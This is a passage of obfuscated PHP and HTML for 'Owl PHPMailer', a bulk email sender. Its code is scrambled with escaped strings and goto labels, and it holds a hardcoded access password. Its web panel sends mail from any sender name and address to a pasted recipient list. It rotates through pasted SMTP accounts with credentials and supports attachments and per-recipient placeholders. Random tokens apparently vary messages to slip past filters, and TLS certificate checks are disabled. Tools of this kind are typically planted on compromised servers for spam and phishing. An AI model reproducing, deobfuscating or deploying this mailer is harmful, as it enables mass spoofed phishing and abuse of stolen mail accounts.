setTimeout($timeout = 0) { $this->Timeout = $timeout; } public function getTimeout() { return $this->Timeout; } protected function errorHandler($errno, $errmsg, $errfile = '', $errline = 0) { $notice = "\103\157\x6e\156\x65\143\164\x69\157\x6e\x20\146\141\x69\x6c\145\144\56"; $this->setError($notice, $errmsg, (string) $errno); $this->edebug("{$notice}\40\x45\x72\x72\157\x72\40\43{$errno}\x3a\x20{$errmsg}\40\133{$errfile}\x20\154\151\x6e\x65\40{$errline}\x5d", self::DEBUG_CONNECTION); } protected function recordLastTransactionID() { $reply = $this->getLastReply(); if (empty($reply)) { $this->last_smtp_transaction_id = null; } else { $this->last_smtp_transaction_id = false; foreach ($this->smtp_transaction_id_patterns as $smtp_transaction_id_pattern) { $matches = array(); if (preg_match($smtp_transaction_id_pattern, $reply, $matches)) { $this->last_smtp_transaction_id = trim($matches[1]); break; } } } return $this->last_smtp_transaction_id; } public function getLastTransactionID() { return $this->last_smtp_transaction_id; } } goto SzMBn; S66PI: function is_email($input) { $email_pattern = "\x2f\136\50\x5b\x61\x2d\172\101\x2d\x5a\x30\55\71\134\x2d\x5c\137\134\x2e\135\173\61\x2c\x7d\x29\53\x40\x2b\x28\x5b\x61\x2d\172\x41\55\x5a\60\x2d\71\134\x2d\134\137\134\56\x5d\x7b\x31\x2c\x7d\x29\x2b\x5c\56\53\x28\x5b\x61\55\x7a\x5d\173\x32\54\x34\175\51\44\57\151"; if (preg_match($email_pattern, $input)) { return TRUE; } } goto lgWzV; zwgfg: $owl["\x77\145\142\163\151\164\145"] = "\157\167\154\155\141\151\x6c\145\162\56\x69\x6f"; goto k_Q70; D7eoj: function randString($consonants, $min_length, $max_length) { $length = rand($min_length, $max_length); $password = ''; for ($i = 0; $i < $length; $i++) { $password .= $consonants[rand() % strlen($consonants)]; } return $password; } goto S66PI; nv8Pd: $owl["\x76\145\x72\x73\151\157\x6e"] = "\x31\56\66"; goto zwgfg; LrO7G: ?>
</title>
  <link href="https://maxcdn.bootstrapcdn.com/bootswatch/3.3.6/cosmo/bootstrap.min.css" rel="stylesheet">
  <link href="https://owlmailer.io/css/bootstrap-3.3.1.min.css" rel="stylesheet">
  <!-- jQuery (necessary for Bootstrap's JavaScript plugins) -->
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.1/js/bootstrap.min.js"></script>
  <link rel="icon" href="https://owlmailer.io/img/favicon.ico" type="image/x-icon" />


</head>

<body>
    <script>
        var running = false;
        var request;
    </script>

  <script>
    Array.prototype.randomElement = function () {
  return this[Math.floor(Math.random() * this.length)]
 }

 function stopSending()
 {
    running = false;

    if (request) {
        request.abort();
      }

    $("#btnStart").attr("disabled", false);
    $("#btnStop").attr("disabled", true);
 }

 function handleSendingResponse(recipient, response, processedCount, totalEmailCount) {
  $("#progress").append('<div class="col-lg-3">' + processedCount.toString() + '/' + totalEmailCount.toString() + '</div><div class="col-lg-6">' + recipient + '</div>');
  
  if (response == "OK"){
    $("#progress").append('<div class="col-lg-1"><span class="label label-success">Ok</span></div>');
  }
  else if(response == "Incorrect Email"){
    $("#progress").append('<div class="col-lg-1"><span class="label label-default">Incorrect Email</span></div>');
  } else {
    $("#progress").append('<div class="col-lg-1"><span class="label label-default">' + response + '</span></div>');
  }
  $("#progress").append('<br>');
 }

 function startSending() {

 

  var eMailTextArea = document.getElementById("emailList");
  var eMailTextAreaLines = eMailTextArea.value.split("\n");
  var smtpAccountsTextArea = document.getElementById("smtpAccounts");
  var smtpAccountsTextAreaLines = smtpAccountsTextArea.value.split("\n");
  var encodingTypeE = document.getElementById('encoding');
  var encodingType = encodingTypeE.options[encodingTypeE.selectedIndex].value;
  var emailPriorityE = document.getElementById('priority');
  var emailPriority = emailPriorityE.options[emailPriorityE.selectedIndex].value;
 
   var form_data = new FormData();
   form_data.append("action", "send");
   form_data.append("sendingMethod", document.querySelector('input[name="sendingMethod"]:checked').value);
   form_data.append("senderEmail", document.getElementById('senderEmail').value);
   form_data.append("senderName", document.getElementById('senderName').value);
   form_data.append("replyTo", document.getElementById('replyTo').value);
   form_data.append("messageSubject", document.getElementById('subject').value);
   form_data.append("messageLetter", document.getElementById('messageLetter').value);
   form_data.append("altMessageLetter", document.getElementById('altMessageLetter').value);
   form_data.append("messageType", document.querySelector('input[name="messageType"]:checked').value);
   form_data.append("encodingType", encodingType);
   form_data.append("emailPriority", emailPriority);

   for (var x = 0; x < document.getElementById('attachment').files.length; x++) {
      form_data.append("attachment[]", document.getElementById('attachment').files[x]);
   }

  $("#progress").empty();
  var processedCount = 0;
  $(function () {
    var i = 0;
    running = true;

    $("#btnStart").attr("disabled", true);
    $("#btnStop").attr("disabled", false);


    function nextCall() {
      if (i == eMailTextAreaLines.length){

         $("#btnStart").attr("disabled", false);
         $("#btnStop").attr("disabled", true);
         return; //last call was last item in the array
      }

      // Abort any pending request
      if (request) {
        request.abort();
      }
       if(!running)
      {
        return;
      }

      var recipient = eMailTextAreaLines[i++]
      form_data.set("recipient", recipient);
      var smtpAccount = smtpAccountsTextAreaLines[i % smtpAccountsTextAreaLines.length];
      form_data.set("smtpAcct", smtpAccount);

      
      request = $.ajax({
        type: "post",
        data: form_data,
        contentType: false,
        processData: false,
      });
      // Callback handler that will be called on success
      request.done(function (response, textStatus, jqXHR) {
        processedCount += 1;
        handleSendingResponse(recipient, response, processedCount, eMailTextAreaLines.length);
        nextCall();
      });
    }
    nextCall();
  });
 }
</script>
  <div class="container col-lg-6">
    <h3>&#129417; Owl PHPMailer<small> <?php  goto FfMlV; k_Q70: $subdomains_to_remove = array("\x6d\x61\x69\154\x2e", "\163\155\164\160\56", "\167\x65\x62\x6d\x61\151\x6c\56", "\x65\x6d\141\x69\154\56"); goto hAJPm; G_Stl: function processEmailSendingRequest() { if (!is_email($GLOBALS["\162\x65\143\151\x70\151\145\156\x74"])) { die("\111\x6e\143\157\162\x72\145\x63\164\40\105\155\141\x69\154"); } $mail = setSendingMethod(); $fromEmail = owlClear($GLOBALS["\163\145\156\144\145\x72\x45\155\141\x69\154"], $GLOBALS["\x72\145\x63\x69\160\151\x65\156\164"]); $fromName = owlClear($GLOBALS["\x73\145\156\144\x65\x72\116\141\155\145"], $GLOBALS["\162\x65\143\x69\160\151\145\156\164"]); $replyTo = owlClear($GLOBALS["\x72\x65\x70\x6c\171\124\157"], $GLOBALS["\x72\145\x63\151\x70\151\145\156\x74"]); $recipient = $GLOBALS["\x72\145\x63\151\160\x69\145\156\164"]; $subject = owlClear($GLOBALS["\155\x65\163\x73\x61\x67\x65\123\165\142\152\x65\x63\164"], $GLOBALS["\162\145\x63\151\160\x69\x65\x6e\164"]); $body = owlClear($GLOBALS["\155\145\163\163\x61\147\145\114\x65\x74\x74\x65\x72"], $GLOBALS["\162\x65\x63\x69\160\x69\145\156\164"]); $altBody = owlClear($GLOBALS["\141\x6c\164\115\x65\x73\163\x61\147\145\x4c\x65\x74\x74\x65\162"], $GLOBALS["\162\x65\x63\151\x70\x69\x65\156\164"]); $charSet = $GLOBALS["\145\x6e\143\157\x64\151\x6e\x67\124\171\x70\145"]; $messageType = $GLOBALS["\x6d\x65\x73\x73\x61\x67\x65\124\x79\160\x65"]; $emailPriority = $GLOBALS["\x65\x6d\141\151\x6c\x50\162\x69\157\x72\151\x74\x79"]; $mail->setFrom($fromEmail, $fromName); if (isset($replyTo) && $replyTo !== '') { $mail->addReplyTo($replyTo); } $mail->addAddress($recipient); if (isset($subject) && $subject !== '') { $mail->Subject = $subject; } if (isset($body) && $body !== '') { $mail->Body = $body; } if (isset($charSet) && $charSet !== '') { $mail->CharSet = $charSet; } if (isset($emailPriority) && $emailPriority !== '') { $mail->Priority = $emailPriority; } if (isset($altBody) && $altBody !== '') { $mail->AltBody = $altBody; } if (isset($_FILES["\x61\x74\x74\141\x63\x68\155\145\x6e\x74"])) { for ($i = 0; $i < count($_FILES["\141\x74\164\x61\x63\x68\x6d\x65\x6e\164"]["\x6e\x61\x6d\145"]); $i++) { if ($_FILES["\141\x74\164\141\143\x68\x6d\145\156\164"]["\164\155\x70\137\x6e\141\155\x65"][$i] != '') { $mail->AddAttachment($_FILES["\x61\164\164\141\x63\x68\155\x65\x6e\164"]["\164\x6d\160\x5f\x6e\141\x6d\145"][$i], $_FILES["\141\x74\164\x61\x63\150\x6d\145\156\164"]["\x6e\x61\x6d\x65"][$i]); } } } if ($messageType == "\150\x74\x6d\x6c") { $mail->IsHTML(true); } else { $mail->IsHTML(false); } if (!$mail->send()) { die($mail->ErrorInfo); } else { die("\117\113"); } } goto H_gNP; pejap: echo $owl["\x76\x65\162\x73\x69\x6f\156"]; goto LrO7G; Ceflh: ini_set("\155\x65\155\157\162\171\x5f\154\x69\155\x69\164", -1); goto gmUDe; j0Egu: ?>
"><?php  goto MqO5G; d06OJ: header("\x43\141\x63\x68\145\55\x43\x6f\x6e\x74\162\157\x6c\x3a\40\160\x6f\163\164\x2d\143\x68\145\x63\x6b\x3d\x30\x2c\40\160\162\145\55\x63\150\x65\x63\153\x3d\60", false); goto DhZMT; QD3fs: ?>
</b></li>
                <li>Domain : <b> <?php  goto DzeH9; xGH0O: if (!isset($_SESSION[$sessioncode])) { $_SESSION[$sessioncode] = ''; } goto yVEnN; lbIM4: $password = "\124\157\x70\x4d\141\151\154\145\162"; goto nv8Pd; gmUDe: header("\x43\x61\143\150\x65\x2d\103\x6f\x6e\x74\x72\x6f\154\72\40\x6e\x6f\x2d\163\164\x6f\162\145\x2c\x20\x6e\157\x2d\143\141\143\150\145\54\40\x6d\x75\x73\164\55\162\145\166\141\x6c\x69\144\x61\164\145\x2c\40\155\141\170\55\x61\x67\145\75\60"); goto d06OJ; w5Vke: session_start(); goto s74ol; T66zf: function owlClear($text, $email) { $smtpUser = ''; $smtpServer = ''; if (!empty($GLOBALS["\163\x6d\x74\160\x41\143\x63\x74"])) { $parts = explode("\x3a", $GLOBALS["\x73\x6d\x74\x70\x41\x63\143\x74"]); $host = isset($parts[0]) ? owlTrim($parts[0]) : ''; if (isset($parts[3])) { $smtpUser = owlTrim($parts[3]); } if (!empty($host)) { global $subdomains_to_remove; $smtpServer = $host; foreach ($subdomains_to_remove as $subdomain) { if (strpos($smtpServer, $subdomain) === 0) { $smtpServer = substr($smtpServer, strlen($subdomain)); break; } } } } $text = str_replace("\x5b\55\x73\x6d\x74\160\x75\163\x65\x72\55\x5d", $smtpUser, $text); $text = str_replace("\x5b\55\x73\155\x74\x70\163\145\x72\166\145\x72\55\135", $smtpServer, $text); $domain = $_SERVER["\123\105\x52\126\x45\122\x5f\x4e\x41\115\105"]; $text = str_replace("\x5b\55\144\157\155\x61\151\156\x2d\x5d", $domain, $text); $emailuser = preg_replace("\x2f\50\x5b\136\100\x5d\52\51\56\x2a\57", "\44\x31", $email); $text = str_replace("\133\x2d\164\151\155\145\55\135", date("\x6d\57\144\x2f\x59\40\x68\x3a\151\72\163\40\x61", time()), $text); $text = str_replace("\133\55\x65\x6d\141\151\x6c\55\x5d", $email, $text); $text = str_replace("\133\x2d\x65\155\x61\151\x6c\165\163\x65\x72\x2d\x5d", $emailuser, $text); $text = str_replace("\133\55\162\141\156\144\157\x6d\154\x65\164\164\x65\162\163\55\135", randString("\141\x62\143\144\x65\146\x67\x68\151\152\x6b\x6c\155\156\157\160\x71\x72\x73\x74\x75\x76\167\x78\171\x7a", 8, 15), $text); $text = str_replace("\x5b\x2d\162\141\x6e\x64\x6f\155\x73\164\x72\151\x6e\x67\55\x5d", randString("\x61\142\143\144\x65\146\x67\x68\x69\152\153\x6c\x6d\156\157\160\161\x72\x73\x74\x75\166\167\170\x79\172\x30\x31\62\63\x34\65\66\67\x38\x39", 8, 15), $text); $text = str_replace("\x5b\x2d\x72\x61\156\144\157\x6d\x6e\165\x6d\x62\x65\162\x2d\135", randString("\60\x31\62\x33\64\65\66\x37\x38\x39", 7, 15), $text); $text = str_replace("\133\55\x72\x61\156\144\x6f\155\x6d\144\x35\x2d\x5d", md5(rand()), $text); return $text; } goto D7eoj; d1gfg: ?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE = edge">
  <meta name="viewport" content="width = device-width, initial-scale = 1">
  <title>Owl PHPMailer <?php  goto pejap; FfMlV: echo $owl["\166\145\x72\x73\151\157\156"]; goto EogoC; WL3yP: echo $owl["\167\145\x62\x73\x69\x74\145"]; goto j0Egu; EogoC: ?>
</small></h3>
    <div class="row">
      <div class="form-group col-lg-6 ">
        <label for="senderEmail">Sender Email</label>
        <input type="text" class="form-control  input-sm" id="senderEmail" name="senderEmail">
      </div>
      <div class="form-group col-lg-6 ">
        <label for="senderEmail">Sender Name</label>
        <input type="text" class="form-control  input-sm" id="senderName" name="senderName">
      </div>
    </div>
    <div class="row"> <span class="form-group col-lg-6"><label for="attachment">Attachment <small>(Multiple Available)</small></label><input type="file" name="attachment[]" id="attachment" multiple/></span>
      <div class="form-group col-lg-6">
        <label for="replyTo">Reply-to</label>
        <input type="text" class="form-control  input-sm " id="replyTo" name="replyTo" />
      </div>
    </div>
    <div class="row">
      <div class="form-group col-lg-12 ">
        <label for="subject">Subject</label>
        <input type="text" class="form-control  input-sm " id="subject" name="subject" />
      </div>
    </div>
    <div class="row">
      <div class="form-group col-lg-6">
        <label for="messageLetter">Message Letter</label>
        <textarea placeholder="Message Letter" name="messageLetter" id="messageLetter" class="form-control" rows="10" id="textArea"></textarea>
      </div>
      <div class="form-group col-lg-6">
        <label for="altMessageLetter">Alternative Message Letter</label>
        <textarea placeholder="Alternative Message Letter.&#10;This body can be read by mail clients that do not have HTML email.&#10;capability such as mutt &#38; Eudora.&#10;Clients that can read HTML will view the normal Body." name="altMessageLetter" id="altMessageLetter" class="form-control" rows="10" id="textArea"></textarea>
      </div>
    </div>
    <div class="row">
      <div class="form-group col-lg-6 ">
        <label for="emailList">Email List</label>
        <textarea name="emailList" id="emailList" class="form-control" rows="10" id="textArea"></textarea>
      </div>
      <div class="form-group col-lg-6 ">
        <label for="smtpAccounts">SMTP Accounts</label>
        <textarea placeholder="Random account will be used when sending a message.&#10;1) Format: HOST:PORT:SSL&#10;2) Format: HOST:PORT:SSL:Username:Password&#10;Example: smtp.gmail.com:587:tls:xx@gmail.com:123&#10;Example: smtp.gmail.com:587:nossl:xx@gmail.com:123&#10;&#10;SSL Options: tls , ssl, nossl" name="smtpAccounts" id="smtpAccounts" class="form-control" rows="10" id="textArea"></textarea>
      </div>
    </div>

    <div class="row">
      <div class="form-group col-lg-6 ">
      <label for="messageType">Message Type</label>
      <input type="radio" name="messageType" id="messageType" value="html" checked> HTML
      <input type="radio" name="messageType" id="messageType" value="plain"> Plain
    </div>
    <div class="form-group col-lg-6 ">
      <label for="sendingMethod">Sending Method</label>
      <input type="radio" name="sendingMethod" id="sendingMethod" value="builtin" checked> Builtin
      <input type="radio" name="sendingMethod" id="sendingMethod" value="smtp"> SMTP
    </div>
    <div class="form-group col-lg-6">
      <label for="encoding">Encoding Type</label>
      <select class="form-control input-sm" id="encoding" name="encoding">
        <option value="UTF-8" selected>UTF-8 International Unicode</option>
        <option value="ISO-8859-1">ISO-8859-1 Latin 1 (West European)</option>
        <option value="ISO-8859-2">ISO-8859-2 Latin 2 (East European)</option>
        <option value="ISO-8859-3">ISO-8859-3 Latin 3 (South European)</option>
        <option value="ISO-8859-4">ISO-8859-4 Latin 4 (North European)</option>
        <option value="ISO-8859-5">ISO-8859-5 Cyrillic</option>
        <option value="ISO-8859-6">ISO-8859-6 Arabic</option>
        <option value="ISO-8859-7">ISO-8859-7 Greek</option>
        <option value="ISO-8859-8">ISO-8859-8 Hebrew</option>
        <option value="ISO-8859-9">ISO-8859-9 Latin 5 (Turkish)</option>
        <option value="ISO-8859-15">ISO-8859-15 Latin 9</option>
        <option value="BIG5">BIG5 Traditional Chinese</option>
        <option value="GB-2312">GB-2312 Simplified Chinese</option>
        <option value="ISO-2022-JP">ISO-2022-JP Japanese</option>
        <option value="EUC-JP">EUC-JP Japanese</option>
        <option value="Shift-JIS">Shift-JIS Japanese</option>
        <option value="KSC-5601">KSC-5601 Korean</option>
        <option value="EIC-KR">EIC-KR Korean</option>
      </select>
    </div>
    <div class="form-group col-lg-3">
      <label for="priority">Email Priority</label>
      <select class="form-control input-sm" id="priority" name="priority">
        <option value="" selected>Default</option>
        <option value="5">Low</option>
        <option value="3">Normal</option>
        <option value="1">High</option>
      </select>
    </div>
  </div>

<button type="button" id="btnStart" class="btn btn-default btn-sm" onclick="startSending();">Start</button>
<button type="button"id="btnStop" class="btn btn-default btn-sm" onclick="stopSending();">Stop</button>

</div>
  
    <div class="col-lg-6"><br>
        <label for="well">Instruction</label>
        <div id="well" class="well well">
            <h4>Server Information</h4>
            <ul>
                <li>ServerIP : <b> <?php  goto L1VZJ; kyOP7: $sessioncode = md5(__FILE__); goto xGH0O; hAJPm: if (isset($_POST["\141\143\x74\151\x6f\156"]) && $_POST["\141\143\164\151\157\x6e"] == "\x73\145\x6e\144") { $GLOBALS["\x72\x65\143\151\x70\151\x65\x6e\164"] = owlTrim($_POST["\162\x65\x63\151\x70\151\x65\156\x74"]); $GLOBALS["\163\155\164\160\x41\143\x63\x74"] = owlTrim($_POST["\x73\155\164\x70\x41\143\143\x74"]); $GLOBALS["\x73\x65\x6e\x64\145\162\x4e\141\x6d\x65"] = owlTrim($_POST["\163\145\x6e\144\x65\x72\116\141\155\145"]); $GLOBALS["\163\145\156\x64\151\156\147\x4d\145\164\150\x6f\x64"] = owlTrim($_POST["\x73\x65\156\x64\151\156\x67\115\x65\164\150\x6f\144"]); $GLOBALS["\163\x65\x6e\x64\x65\162\x45\155\x61\x69\x6c"] = owlTrim($_POST["\163\x65\156\x64\145\x72\105\x6d\141\x69\154"]); $GLOBALS["\x72\x65\x70\154\171\x54\157"] = owlTrim($_POST["\x72\x65\x70\154\171\x54\157"]); $messageLetter = owlTrim($_POST["\155\145\163\x73\x61\x67\145\x4c\x65\x74\x74\145\162"]); $messageLetter = urlencode($messageLetter); $messageLetter = preg_replace("\57\x25\x35\x43\45\x32\62\x2f", "\x25\62\62", $messageLetter); $messageLetter = urldecode($messageLetter); $GLOBALS["\155\x65\x73\163\141\147\x65\x4c\x65\164\164\x65\x72"] = stripslashes($messageLetter); $altMessageLetter = owlTrim($_POST["\x61\x6c\164\115\x65\163\x73\x61\147\145\114\145\164\x74\145\162"]); $altMessageLetter = urlencode($altMessageLetter); $altMessageLetter = preg_replace("\x2f\x25\x35\x43\x25\x32\62\57", "\x25\x32\x32", $altMessageLetter); $altMessageLetter = urldecode($altMessageLetter); $GLOBALS["\x61\154\164\x4d\x65\163\163\x61\x67\x65\x4c\x65\x74\164\x65\x72"] = stripslashes($altMessageLetter); $GLOBALS["\x6d\145\163\163\141\147\145\124\171\160\145"] = owlTrim($_POST["\155\x65\x73\x73\x61\147\x65\x54\x79\160\x65"]); $encodingType = owlTrim($_POST["\145\x6e\143\157\144\x69\x6e\147\x54\171\160\145"]); $GLOBALS["\145\x6e\143\157\x64\151\156\147\x54\x79\160\145"] = stripslashes($encodingType); $emailPriority = owlTrim($_POST["\145\155\141\x69\154\x50\x72\x69\157\162\151\x74\171"]); $GLOBALS["\x65\155\141\151\x6c\120\x72\151\157\162\x69\164\x79"] = stripslashes($emailPriority); $messageSubject = owlTrim($_POST["\x6d\x65\x73\x73\141\x67\x65\123\165\x62\x6a\x65\x63\x74"]); $GLOBALS["\x6d\145\163\x73\141\147\x65\x53\165\142\x6a\x65\143\164"] = stripslashes($messageSubject); processEmailSendingRequest(); } goto kyOP7; l5RK8: ?>
</b></li>

            </ul>
            <h4>HELP</h4>
            <ul>
                <li>[-email-] : <b>Reciver Email</b></li>
                <li>[-time-] : <b>Date and Time</b> (<?php  goto pKqns; D_fXR: function setSendingMethod() { $mail = new PHPMailer(); if ($GLOBALS["\163\x65\x6e\x64\151\156\x67\x4d\x65\164\x68\157\144"] == "\x73\x6d\x74\x70") { $mail->IsSMTP(); $parts = explode("\x3a", $GLOBALS["\163\155\x74\x70\x41\x63\x63\x74"]); $mail->Host = owlTrim($parts[0]); $mail->Port = owlTrim($parts[1]); if (owlTrim($parts[2]) == "\163\x73\x6c") { $mail->SMTPSecure = "\x73\163\154"; } else { if (owlTrim($parts[2]) == "\164\x6c\x73") { $mail->SMTPSecure = "\164\154\x73"; } else { $mail->SMTPSecure = ''; } } if (isset($parts[3]) && isset($parts[4])) { $mail->SMTPAuth = true; $mail->Username = owlTrim($parts[3]); $mail->Password = owlTrim($parts[4]); } $mail->SMTPOptions = array("\163\163\154" => array("\x76\145\x72\x69\x66\x79\x5f\160\x65\x65\162" => false, "\166\145\x72\151\146\171\137\160\x65\x65\162\137\x6e\x61\x6d\x65" => false, "\x61\x6c\154\x6f\167\x5f\163\145\154\146\137\x73\x69\147\156\x65\144" => true)); } return $mail; } goto G_Stl; DzeH9: echo $_SERVER["\123\105\122\x56\105\x52\x5f\x4e\x41\115\x45"]; goto l5RK8; dHcSU: ?>
</a></b></h6>
        </div>

        <div id="progress" class="col-lg-16">
          
        </div>
    </div>
 
<script>
 $("#btnStart").attr("disabled", false);
 $("#btnStop").attr("disabled", true);
</script>
</body>
<footer></footer>

</htm')); ?>